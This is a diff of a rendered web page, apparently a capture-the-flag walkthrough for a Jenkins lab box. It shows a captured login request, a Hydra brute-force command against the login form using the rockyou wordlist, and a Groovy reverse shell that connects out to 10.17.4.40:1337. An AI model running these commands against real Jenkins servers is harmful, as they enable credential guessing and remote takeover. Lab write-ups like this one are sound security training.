+</span></span><span style="display:flex;"><span>Referer: http://127.0.0.1:8080/loginError
+</span></span><span style="display:flex;"><span>Cookie: JSESSIONID.851f9285<span style="color:#f92672">=</span>node0c86ow5ll7bfx1kor9ova06bxn0.node0
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>j_username<span style="color:#f92672">=</span>admin&amp;j_password<span style="color:#f92672">=</span>er&amp;from<span style="color:#f92672">=</span>%2F&amp;Submit<span style="color:#f92672">=</span>Sign+in 
+</span></span></code></pre></div></li>
 <li>
 <p>Hydra payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra 127.0.0.1 -s <span style="color:#ae81ff">8080</span> -V -f http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt
-
-* -s: port number
-* -f: Stop brute forcing the login page once the password is found.
-* -V: Display the attempts being made by Hydra and other details.
-* http-form-post: Indicates the type of form being used <span style="color:#f92672">(</span>i.e. POST<span style="color:#f92672">)</span>.
-* ^USER^: tells Hydra to use the username or list in the field.
-* ^PASS^: tells Hydra to use the password list supplied.
-* -l: indicates a single username e.g. “admin”<span style="color:#f92672">(</span>use -L <span style="color:#66d9ef">for</span> a username list<span style="color:#f92672">)</span>.
-* -P: indicates use the following password list e.g. rockyou.txt
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra 127.0.0.1 -s <span style="color:#ae81ff">8080</span> -V -f http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* -s: port number
+</span></span><span style="display:flex;"><span>* -f: Stop brute forcing the login page once the password is found.
+</span></span><span style="display:flex;"><span>* -V: Display the attempts being made by Hydra and other details.
+</span></span><span style="display:flex;"><span>* http-form-post: Indicates the type of form being used <span style="color:#f92672">(</span>i.e. POST<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>* ^USER^: tells Hydra to use the username or list in the field.
+</span></span><span style="display:flex;"><span>* ^PASS^: tells Hydra to use the password list supplied.
+</span></span><span style="display:flex;"><span>* -l: indicates a single username e.g. “admin”<span style="color:#f92672">(</span>use -L <span style="color:#66d9ef">for</span> a username list<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>* -P: indicates use the following password list e.g. rockyou.txt
+</span></span></code></pre></div></li>
 <li>
 <p>Using found creds to login to <code>jenkins</code></p>
 </li>
@@ -495,10 +511,10 @@ j_username<span style="color:#f92672">=</span>admin&amp;j_password<span style="c
 </li>
 <li>
 <p>To create a reverse shell on the system, we need to use Groovy script. Since it is basically Java, we can use a Java reverse shell from pentestmonkey.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">r <span style="color:#f92672">=</span> Runtime.getRuntime<span style="color:#f92672">()</span>
-p <span style="color:#f92672">=</span> r.exec<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.17.4.40/1337;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">]</span> as String<span style="color:#f92672">[])</span>
-p.waitFor<span style="color:#f92672">()</span>
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>r <span style="color:#f92672">=</span> Runtime.getRuntime<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> r.exec<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.17.4.40/1337;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">]</span> as String<span style="color:#f92672">[])</span>
+</span></span><span style="display:flex;"><span>p.waitFor<span style="color:#f92672">()</span>
+</span></span></code></pre></div></li>
 <li>
 <p>reverse connection is active</p>
 <p><img src="https://i.imgur.com/4oJX935.png" alt="img"></p>
@@ -544,7 +560,7 @@ data-ad-slot="7160066188"></ins></p>
 
             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2023 Classroom</p>
+              <p>© 2010 - 2025 Classroom</p>
               
 
               
@@ -755,7 +771,7 @@ data-ad-slot="7160066188"></ins></p>
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/classroom.anir0y.in/index.json', function (data) {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
